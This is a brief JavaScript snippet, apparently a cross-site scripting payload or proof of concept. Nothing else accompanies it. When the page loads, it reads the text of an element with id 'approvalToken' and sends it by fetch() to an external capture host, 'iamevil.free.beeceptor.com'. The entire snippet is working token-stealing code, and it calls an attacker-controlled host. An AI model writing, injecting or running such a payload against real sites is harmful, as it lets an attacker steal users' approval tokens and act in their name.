window.onload = () => {
    // Access the approvalToken element
    const approvalToken = document.getElementById('approvalToken').textContent;

    // Send the approvalToken directly to Beeceptor
    fetch('https://iamevil.free.beeceptor.com/?token=' + encodeURIComponent(approvalToken));
};
